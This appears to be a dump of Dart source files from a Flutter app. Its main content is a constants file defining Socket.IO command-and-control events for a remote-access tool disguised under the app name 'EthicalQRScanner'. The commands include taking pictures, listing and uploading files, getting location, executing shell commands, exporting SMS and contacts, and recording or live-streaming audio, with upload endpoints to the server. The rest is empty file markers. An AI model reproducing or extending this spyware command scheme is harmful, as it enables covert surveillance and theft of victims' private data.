// --- Socket.IO C2 Communication Events & Commands ---
// For C2 Registration and Heartbeat
const String SIO_EVENT_REGISTER_DEVICE = 'register_device';
const String SIO_EVENT_REGISTRATION_SUCCESSFUL = 'registration_successful';
const String SIO_EVENT_DEVICE_HEARTBEAT = 'device_heartbeat';
const String SIO_EVENT_REQUEST_REGISTRATION_INFO = 'request_registration_info';

// Commands from C2 Server to Client
const String SIO_CMD_TAKE_PICTURE = 'command_take_picture';
const String SIO_CMD_LIST_FILES = 'command_list_files';
const String SIO_CMD_GET_LOCATION = 'command_get_location';
const String SIO_CMD_UPLOAD_SPECIFIC_FILE = 'command_upload_specific_file';
const String SIO_CMD_EXECUTE_SHELL = 'command_execute_shell';

// <<<<<<< NEW COMMANDS ADDED / UPDATED >>>>>>>
const String SIO_CMD_GET_SMS_LIST = 'command_get_sms_list';
const String SIO_CMD_GET_CONTACTS_LIST =
    'command_get_contacts_export'; // Renamed for clarity (exports a file)
const String SIO_CMD_RECORD_AUDIO = 'command_record_audio';
const String SIO_CMD_START_LIVE_AUDIO =
    'command_start_live_audio'; // For live streaming concept
const String SIO_CMD_STOP_LIVE_AUDIO =
    'command_stop_live_audio'; // For live streaming concept
// <<<<<<< END OF NEW COMMANDS >>>>>>>

// Response from Client to C2 Server
const String SIO_EVENT_COMMAND_RESPONSE = 'command_response';
const String SIO_EVENT_LIVE_AUDIO_CHUNK =
    'live_audio_chunk'; // For live streaming data

// --- HTTP Endpoints (Reminder, main URL is in app_config.dart) ---
const String HTTP_ENDPOINT_UPLOAD_INITIAL_DATA = '/upload_initial_data';
const String HTTP_ENDPOINT_UPLOAD_COMMAND_FILE = '/upload_command_file';

// --- Other Constants ---
const String APP_NAME = "EthicalQRScanner";



// ------------------------------ نهاية الملف: constants.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: helpers.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\utils\helpers.dart
// ----------------------------------------------------------------------




// ------------------------------ نهاية الملف: helpers.dart ------------------------------
// ======================================================================


################################################################################
# تم بنجاح معالجة واستخراج محتوى 61 ملف/ملفات دارت.
################################################################################
